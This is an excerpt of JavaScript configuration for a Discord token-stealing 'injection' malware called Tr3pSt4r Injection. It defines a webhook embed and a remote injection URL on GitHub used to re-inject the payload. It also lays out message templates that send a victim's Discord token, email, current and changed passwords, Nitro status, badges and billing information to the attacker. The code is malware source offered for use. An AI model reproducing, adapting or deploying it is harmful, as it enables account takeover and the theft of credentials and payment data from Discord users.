...
const config = {
  ...
  embed_name: 'Tr3pSt4r Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1057917394665885706/1058048729057341520/93481e386f55f44c967ad5b8a496ab28_w200.gif'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/Tr3pst4r/tr3pst4r-injection/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name:"<:crownred:1058523870828691627> Token",
            value:`\```${token}\```\n`,
            inline: false,
          },
          {
            name:"<:starxglow:1058525180789534850> Account Info**",
            value: `Email: **${email}** - Password: **${password}**`,
            inline: false,
          },
          {
            name: '<:face:1058523854500274346> Discord Info',
        ...
        footer: {
          text: '🎉・Discord Injection By github.com/tr3pst4r',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          ...
          {
            name: '<:face:1058523854500274346> Password Changed',
            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '<:starxglow:1058525180789534850> Discord Info',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
        ],
    ...
    embeds: [
      {
        ...
        fields: [
          ...
          {
            name: '<:face:1058523854500274346> Email Changed',
